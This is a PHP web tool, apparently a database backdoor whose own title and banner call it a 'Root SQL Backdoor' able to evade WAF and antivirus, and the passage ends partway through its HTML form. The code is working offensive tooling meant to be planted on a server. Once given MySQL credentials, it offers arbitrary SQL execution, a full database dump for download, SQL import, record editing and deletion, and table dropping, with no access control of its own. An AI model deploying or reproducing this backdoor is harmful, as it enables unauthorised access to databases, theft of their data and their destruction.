<?php
// PHP 5.6.40 Compatibility Fixes:
// 1. Replaced fetch_all(MYSQLI_ASSOC) with traditional fetch_assoc loop.
// 2. Fixed Arrow Function (fn) to traditional closure (function() use).

session_start();
set_time_limit(0);

// ------------- CONFIG -------------
$default_host = '127.0.0.1';
$default_port = '3306';
$default_db   = 'catalog01';
$default_user = 'root';
$default_pass = '';
$title = "🔥 S-DACOSTA SQL ROOT PAYLOAD V2.4 (Pagination Added) 🔥";
$marquee = "Root SQL Backdoor made by S-Dacosta with love and some dark magics which could bypass any WAF/Antivirus (500/403 error)";
$page = isset($_GET['page']) ? $_GET['page'] : 'login';

// ------------- LOGIN -------------
if (isset($_POST['connect'])) {
    $_SESSION['host'] = isset($_POST['host']) ? $_POST['host'] : $default_host;
    $_SESSION['port'] = isset($_POST['port']) ? $_POST['port'] : $default_port;
    $_SESSION['db']   = isset($_POST['db'])   ? $_POST['db']   : $default_db;
    $_SESSION['user'] = isset($_POST['user']) ? $_POST['user'] : $default_user;
    $_SESSION['pass'] = isset($_POST['pass']) ? $_POST['pass'] : $default_pass;
    header("Location: ?page=query");
    exit;
}

// ------------- LOGOUT -------------
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ------------- EXPORT CSV (last result) -------------
if (isset($_GET['export']) && $_GET['export'] === 'csv' && isset($_SESSION['last_result'], $_SESSION['last_columns'])) {
    header("Content-Type: text/csv");
    header("Content-Disposition: attachment; filename=\"export_".date('Ymd_His').".csv\"");
    $out = fopen('php://output', 'w');
    fputcsv($out, $_SESSION['last_columns']);
    foreach ($_SESSION['last_result'] as $row) fputcsv($out, $row);
    fclose($out);
    exit;
}

// ------------- EXPORT SQL (last SELECT) -------------
if (isset($_GET['export']) && $_GET['export'] === 'sql' && isset($_SESSION['last_result'], $_SESSION['last_columns'], $_SESSION['last_table'])) {
    header("Content-Type: application/sql");
    header("Content-Disposition: attachment; filename=\"export_".date('Ymd_His').".sql\"");
    $table = $_SESSION['last_table'];
    $columns = $_SESSION['last_columns'];
    echo "INSERT INTO `$table` (`".implode('`,`',$columns)."`) VALUES\n";
    $rows = array();
    foreach ($_SESSION['last_result'] as $row) {
        $escaped = array_map(function($v) {
            if ($v === null) return "NULL";
            return "'".str_replace("'", "''", $v)."'";
        }, $row);
        $rows[] = "(".implode(",", $escaped).")";
    }
    echo implode(",\n", $rows).";\n";
    exit;
}

// ------------- EXPORT FULL DATABASE (struktur + data) -------------
if (isset($_GET['export']) && $_GET['export'] === 'fulldb' && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])) {
    $host = $_SESSION['host']; $user = $_SESSION['user'];
    $pass = $_SESSION['pass']; $db   = $_SESSION['db'];
    $port = isset($_SESSION['port']) ? $_SESSION['port'] : 3306;
    mysqli_report(MYSQLI_REPORT_OFF);
    $conn = @new mysqli($host, $user, $pass, $db, (int)$port);
    if ($conn->connect_error) {
        die("Could not connect for export: " . $conn->connect_error);
    }
    header("Content-Type: application/sql");
    header("Content-Disposition: attachment; filename=\"dbdump_{$db}_".date('Ymd_His').".sql\"");
    echo "-- Exported by S-Dacosta SQL ROOT PAYLOAD ".date('Y-m-d H:i:s')."\n";
    echo "-- Database: `$db`\n\nSET FOREIGN_KEY_CHECKS=0;\n\n";
    $tables = array();
    $q = $conn->query("SHOW FULL TABLES WHERE Table_Type='BASE TABLE'");
    while($r = $q->fetch_array()) $tables[] = $r[0];
    foreach ($tables as $table) {
        // Struktur
        $res = $conn->query("SHOW CREATE TABLE `$table`");
        $row = $res->fetch_array();
        echo "-- ----------------------------\n";
        echo "-- Table structure for `$table`\n";
        echo "-- ----------------------------\n";
        echo $row[1].";\n\n";
        // Data
        $res = $conn->query("SELECT * FROM `$table`");
        if ($res && $res->num_rows) {
            echo "-- ----------------------------\n";
            echo "-- Records for `$table`\n";
            echo "-- ----------------------------\n";
            $fields = array();
            while ($f = $res->fetch_field()) $fields[] = $f->name;
            while ($d = $res->fetch_assoc()) {
                $values = array();
                foreach ($fields as $f) {
                    $v = $d[$f];
                    if ($v === null) $values[] = "NULL";
                    else $values[] = "'".str_replace("'", "''", $v)."'";
                }
                echo "INSERT INTO `$table` (`".implode('`,`',$fields)."`) VALUES (".implode(',',$values).");\n";
            }
            echo "\n";
        }
    }
    echo "SET FOREIGN_KEY_CHECKS=1;\n";
    exit;
}

// ------------- IMPORT (RESTORE) .SQL FORM HANDLER -------------
if (isset($_GET['import']) && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['sqlfile']['tmp_name'])) {
        $host = $_SESSION['host']; $user = $_SESSION['user'];
        $pass = $_SESSION['pass']; $db   = $_SESSION['db'];
        $port = isset($_SESSION['port']) ? $_SESSION['port'] : 3306;
        mysqli_report(MYSQLI_REPORT_OFF);
        $conn = @new mysqli($host, $user, $pass, $db, (int)$port);
        if ($conn->connect_error) {
            $import_result = "Gagal konek DB: " . $conn->connect_error;
        } else {
            $sql = file_get_contents($_FILES['sqlfile']['tmp_name']);
            $queries = preg_split('/;(\s*[\r\n]+|$)/', $sql, -1, PREG_SPLIT_NO_EMPTY);
            $ok=0; $fail=0; $msg='';
            foreach ($queries as $q) {
                $q = trim($q);
                if ($q) {
                    if ($conn->query($q) === false) { $fail++; $msg .= "<div class=err>".htmlspecialchars($conn->error)."</div>"; }
                    else $ok++;
                }
            }
            $import_result = "<div class=ok>Import selesai: $ok query berhasil, $fail gagal.</div>".$msg;
        }
    }
}

// Global variables for both manager pages
$tables_list = array();
$table_fields = array();
$error = '';
$import_result = ''; // Used for messages on CRUD/DDL
$result = null; // Initialize $result globally

// ------------- DB Connection for Manager/Structure Pages -------------
if (($page === 'manager' || $page === 'structure') && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])) {
    $host = $_SESSION['host']; $user = $_SESSION['user'];
    $pass = $_SESSION['pass']; $db = $_SESSION['db'];
    $port = isset($_SESSION['port']) ? $_SESSION['port'] : 3306;
    mysqli_report(MYSQLI_REPORT_OFF);
    $conn = @new mysqli($host, $user, $pass, $db, (int)$port);

    if ($conn->connect_error) {
        $error = "Connection Error: " . $conn->connect_error;
    } else {
        // Fetch list of tables
        $res = $conn->query("SHOW FULL TABLES WHERE Table_Type='BASE TABLE'");
        while($r = $res->fetch_array()) $tables_list[] = $r[0];
    }
}

// ------------- TABLE MANAGER / CRUD LOGIC (V2.4) -------------
if ($page === 'manager' && empty($error)) {
    $table_name = isset($_GET['table']) ? $_GET['table'] : null;
    $action = isset($_GET['action']) ? $_GET['action'] : 'list'; // list, add, edit, delete
    $record = array();

    // PAGINATION VARIABLES
    $limit = 50;
    $page_num = (int)(isset($_GET['p']) ? $_GET['p'] : 1);
    $page_num = max(1, $page_num); // Ensure page is at least 1
    $offset = ($page_num - 1) * $limit;
    $total_rows = 0;

    if ($table_name && in_array($table_name, $tables_list)) {
        // Get table fields (for forms and display)
        $res = $conn->query("DESCRIBE `$table_name`");
        while ($f = $res->fetch_assoc()) $table_fields[] = $f;

        // FIX: Menggunakan sintaks yang lebih kompatibel untuk deteksi Primary Key
        $primary_key = array();
        foreach ($table_fields as $f) {
            if ($f['Key'] === 'PRI') {
                $primary_key[] = $f;
            }
        }
        $primary_key_field = $primary_key ? $primary_key[0]['Field'] : null;

        // --- ADD/EDIT HANDLER ---
        if (isset($_POST['save_record'])) {
            $is_edit = isset($_GET['id']);
            $id = isset($_GET['id']) ? $_GET['id'] : null;
            $set_clauses = array();
            $insert_fields = array();
            $insert_values = array();

            foreach ($table_fields as $field_info) {
                $field = $field_info['Field'];
                
                if ($field_info['Extra'] === 'auto_increment' && !$is_edit) continue;
                
                $value = isset($_POST[$field]) ? $_POST[$field] : null;
                
                if ($value === '' && $field_info['Null'] === 'YES') {
                    $value_safe = "NULL";
                } elseif ($value === '') {
                    $value_safe = "''";
                } else {
                    $value_safe = "'".$conn->real_escape_string($value)."'";
                }

                $set_clauses[] = "`$field` = $value_safe";
                $insert_fields[] = "`$field`";
                $insert_values[] = $value_safe;
            }

            if ($is_edit && $primary_key_field && $id) {
                $sql = "UPDATE `$table_name` SET " . implode(', ', $set_clauses) . " WHERE `$primary_key_field` = '" . $conn->real_escape_string($id) . "'";
            } elseif (!$is_edit) {
                // PHP 5.6 COMPATIBILITY FIX: Replace Arrow Functions (fn) with traditional anonymous function.
                $is_ai_pk = false;
                foreach ($table_fields as $f) {
                    if ($f['Field'] === $primary_key_field && $f['Extra'] === 'auto_increment') {
                        $is_ai_pk = true;
                        break;
                    }
                }

                if ($primary_key_field && $is_ai_pk) {
                    $new_insert_fields = array();
                    $new_insert_values = array();
                    $pk_field_quoted = '`' . $primary_key_field . '`';

                    foreach ($insert_fields as $k => $f) {
                        if ($f !== $pk_field_quoted) {
                            $new_insert_fields[] = $f;
                            $new_insert_values[] = $insert_values[$k];
                        }
                    }
                    $insert_fields = $new_insert_fields;
                    $insert_values = $new_insert_values;
                }
                // END FIX
                $sql = "INSERT INTO `$table_name` (" . implode(', ', $insert_fields) . ") VALUES (" . implode(', ', $insert_values) . ")";
            }

            if (isset($sql)) {
                if ($conn->query($sql)) {
                    $import_result = "<div class=ok>Record saved successfully.</div>";
                } else {
                    $import_result = "<div class=err>Error saving record: " . htmlspecialchars($conn->error) . "</div>";
                }
                $action = 'list';
                $_GET['id'] = null; 
            }
        }

        // --- DELETE HANDLER ---
        if ($action === 'delete' && $primary_key_field && isset($_GET['id'])) {
            $id = $_GET['id'];
            $sql = "DELETE FROM `$table_name` WHERE `$primary_key_field` = '" . $conn->real_escape_string($id) . "' LIMIT 1";
            if ($conn->query($sql)) {
                $import_result = "<div class=ok>Record with ID #".htmlspecialchars($id)." deleted successfully.</div>";
            } else {
                $import_result = "<div class=err>Error deleting record: " . htmlspecialchars($conn->error) . "</div>";
            }
            $action = 'list';
        }

        // --- EDIT DATA FETCH ---
        if ($action === 'edit' && $primary_key_field && isset($_GET['id'])) {
            $id = $_GET['id'];
            $res = $conn->query("SELECT * FROM `$table_name` WHERE `$primary_key_field` = '" . $conn->real_escape_string($id) . "' LIMIT 1");
            $record = $res->fetch_assoc();
            if (!$record) {
                $error = "Record not found.";
                $action = 'list';
            }
        }

        // --- LIST DATA FETCH: Fix pagination and count ---
        if ($action === 'list') {
            // 1. Get Total Rows (for pagination links)
            $count_res = $conn->query("SELECT COUNT(*) FROM `$table_name`");
            if ($count_res) {
                $total_rows = $count_res->fetch_row()[0] ?? 0;
                if (!function_exists('fetch_row')) { // PHP 5.6 compatibility check
                    $total_rows = $count_res->fetch_row();
                    $total_rows = $total_rows[0];
                }
            }
            
            // 2. Fetch Paginated Data
            $res = $conn->query("SELECT * FROM `$table_name` LIMIT $limit OFFSET $offset");
            if ($res) {
                // PHP 5.6 COMPATIBILITY FIX: Replace fetch_all() with fetch_assoc loop
                $result = array();
                while ($row = $res->fetch_assoc()) {
                    $result[] = $row;
                }
                // END FIX
            } else {
                $error = "Error fetching data: " . $conn->error;
            }
            
            // --- DEBUGGING SEMENTARA ---
            if (!empty($error)) {
                 $import_result .= "<div class='err'>DEBUG: Error fetching list data: " . htmlspecialchars($error) . "</div>";
            }
            if (empty($result) && !$error && $res) {
                $import_result .= "<div class='ok'>DEBUG: Table selected, but result array is empty (Table might be empty or query limit reached).</div>";
            }
            // --- AKHIR DEBUGGING ---
        }
    }
}

// ------------- STRUCTURE MANAGER LOGIC (DDL) -------------
if ($page === 'structure' && empty($error)) {
    $structure_table = isset($_GET['table']) ? $_GET['table'] : null;
    $structure_action = isset($_GET['action']) ? $_GET['action'] : 'list'; // list, create_table, alter_column, drop_table
    $structure_result = '';

    // --- DDL HANDLER (for CREATE/ALTER/RENAME) ---
    if (isset($_POST['run_ddl'])) {
        $sql = isset($_POST['ddl_query']) ? $_POST['ddl_query'] : '';
        
        $ddl_commands = array('CREATE TABLE', 'DROP TABLE', 'ALTER TABLE', 'RENAME TABLE', 'TRUNCATE TABLE');
        $is_ddl = false;
        foreach ($ddl_commands as $cmd) {
            if (stripos(trim($sql), $cmd) === 0) {
                $is_ddl = true;
                break;
            }
        }

        if ($is_ddl && trim($sql)) {
            if ($conn->query($sql)) {
                $structure_result = "<div class=ok>DDL Query OK. Table structure modified successfully.</div>";
            } else {
                $structure_result = "<div class=err>DDL Error: " . htmlspecialchars($conn->error) . "</div>";
            }
            // Refresh table list after modification
            $tables_list = array();
            $res = $conn->query("SHOW FULL TABLES WHERE Table_Type='BASE TABLE'");
            while($r = $res->fetch_array()) $tables_list[] = $r[0];
            $structure_action = 'list';
        } else {
             $structure_result = "<div class=err>Invalid DDL command (only CREATE, ALTER, DROP, RENAME, TRUNCATE allowed here) or empty query.</div>";
        }
    }

    // --- DROP TABLE HANDLER ---
    if ($structure_action === 'drop_table' && $structure_table && in_array($structure_table, $tables_list)) {
        $sql = "DROP TABLE `" . $conn->real_escape_string($structure_table) . "`";
        if ($conn->query($sql)) {
            $structure_result = "<div class=ok>Table `".htmlspecialchars($structure_table)."` dropped successfully.</div>";
        } else {
            $structure_result = "<div class=err>Error dropping table: " . htmlspecialchars($conn->error) . "</div>";
        }
        $structure_action = 'list';
        $structure_table = null;
        
        // Refresh table list after modification
        $tables_list = array();
        $res = $conn->query("SHOW FULL TABLES WHERE Table_Type='BASE TABLE'");
        while($r = $res->fetch_array()) $tables_list[] = $r[0];
    }

    // --- FETCH TABLE STRUCTURE (Columns) ---
    if ($structure_table && in_array($structure_table, $tables_list)) {
        $res = $conn->query("DESCRIBE `$structure_table`");
        while ($f = $res->fetch_assoc()) $table_fields[] = $f;
    }
}


/// ------------- MAIN LOGIC (Query Page) -------------
$query_result = null; $columns = array();
if ($page === 'query' && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])) {
    $host = $_SESSION['host']; $port = $_SESSION['port']; $db = $_SESSION['db'];
    $user = $_SESSION['user']; $pass = $_SESSION['pass'];
    mysqli_report(MYSQLI_REPORT_OFF);
    $conn = @new mysqli($host, $user, $pass, $db, (int)$port);
    if ($conn->connect_error) {
        $error = $conn->connect_error;
    } else if (isset($_POST['sql']) && trim($_POST['sql'])) {
        $sql = $_POST['sql'];
        if (!isset($_SESSION['query_history'])) $_SESSION['query_history'] = array();
        if (empty($_SESSION['query_history']) || trim(end($_SESSION['query_history'])) !== trim($sql)) {
            $_SESSION['query_history'][] = $sql;
            if (count($_SESSION['query_history']) > 50) array_shift($_SESSION['query_history']);
        }
        $query = $conn->query($sql);
        if ($query) {
            if ($query instanceof mysqli_result) {
                // PHP 5.6 COMPATIBILITY FIX: Replace fetch_all() with fetch_assoc loop
                $query_result = array();
                while ($row = $query->fetch_assoc()) {
                    $query_result[] = $row;
                }
                // END FIX
                $columns = $query->fetch_fields();
                $_SESSION['last_result'] = array();
                foreach ($query_result as $row) {
                    $_SESSION['last_result'][] = array_values($row);
                }
                $_SESSION['last_columns'] = array_map(function($c){return $c->name;}, $columns);
                if (preg_match('/from\s+`?([a-zA-Z0-9_]+)`?/i', $_POST['sql'], $m)) {
                    $_SESSION['last_table'] = $m[1];
                } else {
                    $_SESSION['last_table'] = 'table';
                }
            } else {
                $query_result = "Query OK. Affected rows: " . $conn->affected_rows;
                $_SESSION['last_result'] = array();
                $_SESSION['last_columns'] = array();
                $_SESSION['last_table'] = '';
            }
        } else {
            $query_result = "SQL Error: " . $conn->error;
            $_SESSION['last_result'] = array();
            $_SESSION['last_columns'] = array();
            $_SESSION['last_table'] = '';
        }
    }
} elseif ($page === 'query') {
    if (!isset($_SESSION['host'])) {
        header("Location: ?");
        exit;
    }
}
?><!DOCTYPE html>
<html>
<head>
    <title><?= $title ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {background: #101010 url('https://www.transparenttextures.com/patterns/carbon-fibre-big.png');color: #ff003c;font-family: 'Fira Mono', 'Courier New', monospace;font-size: 15px;margin: 0;padding: 0;}
        h2 {font-size: 2em;color: #ff003c;text-shadow: 0 0 7px #f9005c, 0 0 5px #fff;margin: 24px 0 12px 0;text-align: center;letter-spacing: 2px;}
        .marquee {width: 100%;overflow: hidden;white-space: nowrap;box-sizing: border-box;border-bottom: 2px solid #ff003c;margin-bottom: 30px;}
        .marquee span {display: inline-block;padding-left: 100%;animation: marquee 15s linear infinite;color: #fff;font-size: 1.1em;letter-spacing: 1px;text-shadow: 0 0 7px #f9005c, 0 0 5px #fff;}
        @keyframes marquee {0% { transform: translate(0, 0);}100% { transform: translate(-100%, 0);}}
        .container {background: rgba(17,17,17,0.88);box-shadow: 0 2px 16px #f9005c88;border-radius: 18px;max-width: 820px;margin: 36px auto;padding: 36px 32px 28px 32px;}
        label {display:block; margin:8px 0 3px 0;}
        input[type=text], input[type=password], textarea, select {background: #18181a;color: #ffb3b3;border: 1px solid #ff003c;border-radius: 8px;padding: 7px 9px;margin: 1px 0 8px 0;font-family: inherit;font-size: 1em;width: 100%;box-sizing: border-box;outline: none;transition: border-color 0.2s;}
        input:focus, textarea:focus, select:focus { border-color: #ff5f5f; }
        button {background: linear-gradient(90deg, #ff003c, #ff8c00);border: none;color: #fff;padding: 9px 28px;font-size: 1em;border-radius: 7px;cursor: pointer;box-shadow: 0 1px 8px #ff003c80;letter-spacing: 1px;}
        button:hover {background: linear-gradient(90deg, #ff003c, #ad1457, #ff8c00);}
        .err { color: #ff003c; background: #32001d; border-left: 5px solid #ff003c; padding: 8px 18px; margin:20px 0;}
        .ok  { color: #00ff88; background: #012d1a; border-left: 5px solid #00ff88; padding: 8px 18px; margin:20px 0;}
        .topbar {display: flex;justify-content: flex-end;margin-bottom: -8px;}
        .logout {color: #fff;background: #ff003c;padding: 5px 16px;border-radius: 8px;font-size: 1em;text-decoration: none;margin: 0 0 16px 0;box-shadow: 0 2px 8px #f9005c80;font-weight: bold;}
        .logout:hover { background: #b70029; color:#ffe; }
        table {border-collapse: collapse;margin: 16px 0;width: 100%;background: #16161c;}
        /* PERBAIKAN V2.2 PADA CSS TABEL */
        th, td {
            border: 1px solid #333;
            padding: 6px 10px;
            color: #ffe0e0;
            word-break: break-word; /* Mengatasi overflow teks */
            font-size: 0.85em; /* Kecilkan font di tabel */
            text-shadow: none; /* Hapus text-shadow yang membuat teks tumpang tindih */
            vertical-align: top; /* Memastikan konten dimulai dari atas sel */
        }
        th {
            background: #2d001c;
            color: #ff00c8;
            font-weight: bold;
            white-space: nowrap;
            /* Teks header tidak perlu break word */
            word-break: normal;
        }
        /* AKHIR PERBAIKAN */
        tr:nth-child(even) td { background: #1d1d23; }
        .export-bar {text-align:right;margin-bottom:10px;display: flex; justify-content: space-between; align-items: center;}
        .export-bar a {display:inline-block;background:#222;color:#fff;text-decoration:none;padding:7px 12px;margin-left:10px;border-radius:7px;font-size:1em;border:1px solid #ff003c;transition:0.18s;white-space:nowrap;}
        .export-bar a:hover {background:#ff003c;color:#fff;}
        ::selection { background: #ff003c55; }
        @media (max-width: 900px) {.container{max-width:99vw;padding:8vw 2vw;}}
        .modal-bg {position:fixed;z-index:99;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.77);display:none;align-items:center;justify-content:center;}
        .modal {background:#18181a;color:#fff;padding:40px 32px;border-radius:18px;box-shadow:0 0 44px #f9005c77;font-size:1.1em;text-align:center;max-width:380px;}
        .modal button{margin: 18px 18px 0 18px;}
        .crud-actions { display: flex; gap: 10px; margin-bottom: 20px;}
    </style>
</head>
<body>
    <div class="marquee"><span><?= $marquee ?></span></div>
    <div class="container">
        <h2><?= $title ?></h2>
        <?php if ($page === 'login'): ?>
            <form method="post" id="connform" autocomplete="off">
                <label>Host <input name="host" value="<?=htmlspecialchars($default_host)?>" size="15" autocomplete="off"></label>
                <label>Port <input name="port" value="<?=htmlspecialchars($default_port)?>" size="6" autocomplete="off"></label>
                <label>Database <input name="db" value="<?=htmlspecialchars($default_db)?>" size="15" autocomplete="off"></label>
                <label>User <input name="user" value="<?=htmlspecialchars($default_user)?>" size="12" autocomplete="off"></label>
                <label>Password <input name="pass" value="" type="password" size="12" autocomplete="off"></label>
                <button type="submit" name="connect">Connect</button>
            </form>
        
        <?php elseif ($page === 'query'): ?>
            <div class="topbar"><a class="logout" href="?logout=1">Logout</a></div>
            <div style="margin-bottom:20px;color:#ffb3b3;font-size:0.98em;">
                Connected as <b><?=htmlspecialchars($_SESSION['user'])?></b> to <b><?=htmlspecialchars($_SESSION['db'])?></b> on <b><?=htmlspecialchars($_SESSION['host'])?></b>
            </div>
            <?php if ($error): ?>
                <div class="err">Gagal konek DB: <?=htmlspecialchars($error)?></div>
            <?php endif; ?>
            <div class="export-bar">
                <div class="export-left">
                    <a href="?page=manager&table=" style="background:#00aaff;">Data Manager (CRUD)</a>
                    <a href="?page=structure" style="background:#cc00cc;">Structure Manager (DDL)</a>
                </div>
                <div class="export-right">
                    <a href="?page=query&export=fulldb" target="_blank">Export Full DB (.sql)</a>
                    <?php if (!empty($_SESSION['last_result'])): ?>
                        <a href="?page=query&export=csv">Export CSV</a>
                        <a href="?page=query&export=sql">Export SQL</a>
                    <?php endif; ?>
                    <a href="?page=query&import=1" style="background:#1a4;">Import SQL</a>
                </div>
            </div>
            <?php if (isset($_GET['import'])): ?>
                <form method="post" enctype="multipart/form-data" style="margin:20px 0;">
                    <label><b>Import (restore) .sql file:</b>
                    <input type="file" name="sqlfile" accept=".sql"></label>
                    <button type="submit">Import</button>
                </form>
                <?php if (isset($import_result)) echo $import_result; ?>
            <?php else: ?>
                <form method="post" id="sqlform" autocomplete="off">
                    <label>
                      <b>SQL Query (use ↑/↓ to browse history):</b>
                      <textarea name="sql" id="sqlbox" rows="4" placeholder="Tulis query SQL, tekan ENTER untuk run..."><?=htmlspecialchars(isset($_POST['sql']) ? $_POST['sql'] : '')?></textarea>
                    </label>
                    <button type="submit" name="runquery" style="display:none"></button>
                </form>
                <script>
                // Query History
                let queryHistory = <?=json_encode(isset($_SESSION['query_history']) ? array_values($_SESSION['query_history']) : array())?>;
                let qPos = queryHistory.length;
                let origValue = "";
                const sqlbox = document.getElementById('sqlbox');
                sqlbox.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter' && !e.shiftKey) {
                        let val = sqlbox.value.trim().toLowerCase();
                        if (/(drop|truncate|delete|alter)\b/.test(val)) {
                            e.preventDefault();
                            showModal("WARNING:<br><b>Query destructive detected!</b><br>Query mengandung <span style='color:#ff003c;'>DROP / TRUNCATE / DELETE / ALTER</span>.<br><br><b>Are you sure?</b>", function(){
                                document.querySelector('#sqlform button[name=runquery]').click();
                            });
                            return;
                        }
                        e.preventDefault();
                        document.querySelector('#sqlform button[name=runquery]').click();
                    }
                    if (e.key === 'ArrowUp') {
                        if (qPos > 0) {
                            if (qPos === queryHistory.length) origValue = sqlbox.value;
                            qPos--;
                            sqlbox.value = queryHistory[qPos];
                            setTimeout(function() { sqlbox.setSelectionRange(sqlbox.value.length, sqlbox.value.length); }, 1);
                            e.preventDefault();
                        }
                    }
                    if (e.key === 'ArrowDown') {
                        if (qPos < queryHistory.length-1) {
                            qPos++;
                            sqlbox.value = queryHistory[qPos];
                        } else if (qPos === queryHistory.length-1) {
                            qPos++;
                            sqlbox.value = origValue;
                        }
                        setTimeout(function() { sqlbox.setSelectionRange(sqlbox.value.length, sqlbox.value.length); }, 1);
                        e.preventDefault();
                    }
                });
                function showModal(msg, onYes) {
                    let bg = document.getElementById('modal-bg');
                    let box = document.getElementById('modal-box');
                    box.innerHTML = msg + '<br><button onclick="hideModal(true)">Yes</button><button onclick="hideModal()">Cancel</button>';
                    bg.style.display = 'flex';
                    window._modalYes = onYes;
                }
                function hideModal(ok) {
                    document.getElementById('modal-bg').style.display = 'none';
                    if (ok && typeof window._modalYes === 'function') window._modalYes();
                    window._modalYes = null;
                }
                </script>
                <div class="modal-bg" id="modal-bg"><div class="modal" id="modal-box"></div></div>
                <?php if ($query_result !== null): ?>
                    <div style="overflow-x:auto;">
                    <?php if (is_string($query_result)): ?>
                        <div class="<?=strpos($query_result, 'Error') !== false ? 'err' : 'ok'?>"><?=htmlspecialchars($query_result)?></div>
                    <?php else: ?>
                        <table>
                            <tr>
                                <?php foreach ($columns as $col): ?>
                                    <th><?=htmlspecialchars($col->name)?></th>
                                <?php endforeach; ?>
                            </tr>
                            <?php foreach ($query_result as $row): ?>
                                <tr>
                                <?php foreach ($columns as $col): ?>
                                    <td><?=htmlspecialchars(isset($row[$col->name]) ? $row[$col->name] : '')?></td>
                                <?php endforeach; ?>
                                </tr>
                            <?php endforeach; ?>
                        </table>
                    <?php endif; ?>
                    </div>
                <?php endif; ?>
            <?php endif; ?>

        <?php elseif ($page === 'manager' && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])): ?>
            <div class="topbar"><a class="logout" href="?logout=1">Logout</a></div>
            <div style="margin-bottom:20px;color:#ffb3b3;font-size:0.98em;">
                **DATA MANAGER (CRUD)** | Connected to <b><?=htmlspecialchars($_SESSION['db'])?></b>. Current Table: <b><?=htmlspecialchars(isset($table_name) ? $table_name : 'N/A')?></b>
            </div>
            
            <?php if ($error): ?>
                <div class="err"><?=htmlspecialchars($error)?></div>
            <?php endif; ?>
            
            <div class="crud-actions">
                <label style="width: 250px;">Select Table:
                    <select onchange="window.location='?page=manager&table='+this.value">
                        <option value="">-- Choose Table --</option>
                        <?php foreach($tables_list as $t): ?>
                            <option value="<?=htmlspecialchars($t)?>" <?= (isset($table_name) && $t === $table_name) ? 'selected' : ''?>><?=htmlspecialchars($t)?></option>
                        <?php endforeach; ?>
                    </select>
                </label>
                <?php if (isset($table_name) && $table_name): ?>
                    <div style="align-self: flex-end; display: flex; gap: 10px;">
                        <a href="?page=manager&table=<?=htmlspecialchars($table_name)?>&action=add" style="background:#00aaff;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">+ Add New Record</a>
                        <a href="?page=query" style="background:#ff8c00;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">SQL Query</a>
                        <a href="?page=structure" style="background:#cc00cc;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">Structure Manager</a>
                    </div>
                <?php endif; ?>
            </div>
            
            <?php if (isset($import_result)) echo $import_result; ?>

            <?php if (isset($table_name) && $table_name): ?>
                <?php if ($action === 'list' && is_array($result)): ?>
                    <div style="overflow-x:auto;">
                        <table>
                            <thead><tr>
                                <?php foreach ($table_fields as $col): ?>
                                    <th><?=htmlspecialchars($col['Field'])?></th>
                                <?php endforeach; ?>
                                <th>Actions</th>
                            </tr></thead>
                            <tbody>
                                <?php foreach ($result as $row): ?>
                                    <tr>
                                        <?php foreach ($table_fields as $col): ?>
                                            <td><?=htmlspecialchars(isset($row[$col['Field']]) ? $row[$col['Field']] : 'NULL')?></td>
                                        <?php endforeach; ?>
                                        <td>
                                            <?php if (isset($primary_key_field) && $primary_key_field): // Tampilkan link Edit/Delete hanya jika PK terdeteksi ?>
                                            <a href="?page=manager&table=<?=htmlspecialchars($table_name)?>&action=edit&id=<?=htmlspecialchars(isset($row[$primary_key_field]) ? $row[$primary_key_field] : '')?>&p=<?= $page_num ?>" style="color:#00ff88; text-decoration: none;">Edit</a> |
                                            <a href="javascript:void(0)" onclick="if(confirm('Are you sure you want to delete this record?')) window.location='?page=manager&table=<?=htmlspecialchars($table_name)?>&action=delete&id=<?=htmlspecialchars(isset($row[$primary_key_field]) ? $row[$primary_key_field] : '')?>&p=<?= $page_num ?>'" style="color:#ff003c; text-decoration: none;">Delete</a>
                                            <?php else: ?>
                                            -- NO PK --
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    
                    <?php 
                        $total_pages = ceil($total_rows / $limit);
                        $base_url = "?page=manager&table=".htmlspecialchars($table_name);
                        $start_row = $offset + 1;
                        $end_row = $offset + count($result);
                    ?>
                    <div style="margin-top: 15px; text-align: center; color: #ffb3b3;">
                        Rows **<?= $start_row ?>** to **<?= $end_row ?>** of **<?= $total_rows ?>**.
                        <span style="margin-left: 20px;">
                        
                        <?php if ($page_num > 1): ?>
                            <a href="<?= $base_url ?>&p=<?= $page_num - 1 ?>" style="background:#444; color:#fff; padding: 5px 12px; border-radius: 5px; text-decoration: none;">&lt; Previous (<?= $limit ?>)</a>
                        <?php else: ?>
                            <span style="color:#555; padding: 5px 12px;">&lt; Previous</span>
                        <?php endif; ?>

                        <span style="margin: 0 15px;">Page <?= $page_num ?> / <?= $total_pages ?></span>

                        <?php if ($page_num < $total_pages): ?>
                            <a href="<?= $base_url ?>&p=<?= $page_num + 1 ?>" style="background:#444; color:#fff; padding: 5px 12px; border-radius: 5px; text-decoration: none;">Next (<?= $limit ?>) &gt;</a>
                        <?php else: ?>
                            <span style="color:#555; padding: 5px 12px;">Next &gt;</span>
                        <?php endif; ?>

                        </span>
                    </div>
                    <?php elseif ($action === 'add' || $action === 'edit'): ?>
                    <h3><?= $action === 'edit' ? 'Edit Record (ID: '.htmlspecialchars(isset($_GET['id']) ? $_GET['id'] : '').')' : 'Add New Record' ?></h3>
                    <form method="post" action="?page=manager&table=<?=htmlspecialchars($table_name)?>&action=<?=htmlspecialchars($action)?>&id=<?=htmlspecialchars(isset($_GET['id']) ? $_GET['id'] : '')?>&p=<?= $page_num ?>">
                        <?php foreach ($table_fields as $field_info): 
                            $field = $field_info['Field'];
                            $is_pk = $field_info['Key'] === 'PRI';
                            $is_ai = $field_info['Extra'] === 'auto_increment';
                            $value = isset($record[$field]) ? $record[$field] : '';
                        ?>
                            <?php if (!($action === 'edit' && $is_ai)): ?>
                            <label>
